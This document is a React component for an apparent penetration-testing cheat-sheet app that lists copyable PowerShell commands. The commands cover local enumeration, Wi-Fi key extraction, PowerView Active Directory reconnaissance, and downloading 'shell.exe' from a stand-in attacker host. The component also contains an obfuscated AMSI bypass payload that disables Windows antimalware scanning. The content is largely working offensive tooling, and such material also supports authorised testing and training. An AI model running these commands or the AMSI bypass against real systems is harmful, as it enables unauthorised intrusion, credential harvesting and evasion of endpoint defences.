import React, { useState } from 'react';
import { Card, Button, TabNav, PayloadBlock } from '../ui';
import { Terminal, Copy, Check, Shield } from 'lucide-react';

export default function PowerShellTool() {
    const [activeTab, setActiveTab] = useState('system');
    const [showToast, setShowToast] = useState(false);

    const tabs = [
        { id: 'system', label: 'System Enum' },
        { id: 'ad', label: 'Active Directory' },
        { id: 'amsi', label: 'AMSI Bypass' },
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const SYSTEM_ENUM = [
        { title: 'System Information', cmd: 'systeminfo' },
        { title: 'Computer System Details', cmd: 'Get-WmiObject Win32_ComputerSystem' },
        { title: 'FQDN', cmd: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' },
        { title: 'Security Patches (PowerShell)', cmd: 'Get-Hotfix -description "Security update"' },
        { title: 'Security Patches (WMIC)', cmd: 'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn' },
        { title: 'Environment Variables', cmd: 'Get-ChildItem Env: | ft Key,Value' },
        { title: 'Environment (CMD)', cmd: 'set' },
        { title: 'WLAN Profiles', cmd: 'netsh wlan show profiles' },
        { title: 'WLAN Password', cmd: 'netsh wlan show profile name="PROFILE-NAME" key=clear' },
        { title: 'Download File (PowerShell)', cmd: 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"' },
        { title: 'Download (certutil)', cmd: 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe' },
    ];

    const AD_ENUM = {
        powerview: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
        domain: [
            { title: 'Domain Name', cmd: 'Get-NetDomain' },
            { title: 'Forest Domains', cmd: 'Get-NetForestDomain' },
            { title: 'Domain SID', cmd: 'Get-DomainSID' },
            { title: 'Domain Policy', cmd: 'Get-DomainPolicy' },
            { title: 'Organizational Units', cmd: 'Get-NetOU' },
            { title: 'Domain Trusts', cmd: 'Get-NetDomainTrust' },
        ],
        computers: [
            { title: 'All Computers', cmd: 'Get-NetComputer' },
            { title: 'Pingable Hosts', cmd: 'Get-NetComputer -Ping' },
            { title: 'Windows 7 Computers', cmd: 'Get-NetComputer -OperatingSystem "Windows 7 Ultimate"' },
        ],
        admins: [
            { title: 'Domain Admins', cmd: 'Get-NetGroupMember -GroupName "Domain Admins"' },
            { title: 'Admin Groups', cmd: 'Get-NetGroup *admin*' },
            { title: 'Local Admins', cmd: 'Get-NetLocalGroup -ComputerName PCNAME-001' },
            { title: 'User Group Membership', cmd: 'Get-NetGroup -UserName "username"' },
        ],
        gpo: [
            { title: 'GPO for Computer', cmd: 'Get-NetGPO -ComputerName computername.domain.com' },
        ],
        passwords: [
            { title: 'Password Last Set', cmd: 'Get-UserProperty -Properties pwdlastset' },
            { title: 'Search User Descriptions', cmd: 'Find-UserField -SearchField Description -SearchTerm "pass"' },
        ],
        acl: [
            { title: 'User ACL', cmd: 'Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs' },
            { title: 'GPO Edit Rights', cmd: 'Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}' },
            { title: 'Password Reset Rights', cmd: 'Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"' },
        ],
        scripts: [
            {
                title: 'Enumerate Domain Users',
                cmd: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()`
            },
            {
                title: 'Enumerate Domain Groups',
                cmd: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result) { $obj.Properties.name }`
            },
            {
                title: 'Detect Service Principal Names (SPNs)',
                cmd: `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()`
            },
        ],
    };

    const AMSI_BYPASS = `S\`eT-It\`em ('V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]("{1}{0}"-F'F','rE' ) ); ( Get-varI\`A\`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A\`ss\`Embly"."GET\`TY\`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g\`etf\`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ) )."sE\`T\`VaLUE"( \${n\`ULl},\${t\`RuE} );`;

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white flex items-center gap-2">
                    <Terminal className="text-htb-green" size={24} />
                    PowerShell Commands
                </h2>
                <p className="text-gray-400">
                    Essential PowerShell commands for Windows enumeration and Active Directory attacks
                </p>
            </div>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            {/* System Enumeration Tab */}
            {activeTab === 'system' && (
                <div className="space-y-4">
                    <p className="text-sm text-gray-400">
                        Local system reconnaissance and credential harvesting commands
                    </p>
                    <PayloadBlock
                        content={SYSTEM_ENUM.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                    />
                </div>
            )}

            {/* Active Directory Tab */}
            {activeTab === 'ad' && (
                <div className="space-y-6">
                    <Card className="!p-6 bg-yellow-500/10 border-yellow-500/20">
                        <div className="flex items-start gap-3">
                            <Shield className="text-yellow-500 mt-1" size={20} />
                            <div className="flex-1">
                                <p className="text-sm font-bold text-yellow-500 mb-2">Requires PowerView.ps1</p>
                                <div className="flex items-center gap-2">
                                    <code className="text-xs text-yellow-300 break-all flex-1">{AD_ENUM.powerview}</code>
                                    <Button size="sm" variant="outline" onClick={() => copyToClipboard(AD_ENUM.powerview)} icon={<Copy size={12} />} />
                                </div>
                            </div>
                        </div>
                    </Card>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Domain Enumeration</h3>
                        <PayloadBlock
                            content={AD_ENUM.domain.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Computer Enumeration</h3>
                        <PayloadBlock
                            content={AD_ENUM.computers.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Admin Groups & Accounts</h3>
                        <PayloadBlock
                            content={AD_ENUM.admins.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">GPO Enumeration</h3>
                        <PayloadBlock
                            content={AD_ENUM.gpo.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">Password Enumeration</h3>
                        <PayloadBlock
                            content={AD_ENUM.passwords.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">ACL Enumeration</h3>
                        <PayloadBlock
                            content={AD_ENUM.acl.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>

                    <div>
                        <h3 className="text-lg font-bold text-white mb-3">AD Scripts</h3>
                        <PayloadBlock
                            content={AD_ENUM.scripts.map(item => `# ${item.title}\n${item.cmd}`).join('\n\n')}
                        />
                    </div>
                </div>
            )}

            {/* AMSI Bypass Tab */}
            {activeTab === 'amsi' && (
                <div className="space-y-4">
                    <PayloadBlock
                        title="AMSI / ETW Bypass"
                        content={AMSI_BYPASS}
                    />
                </div>
            )}

            {/* Toast */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
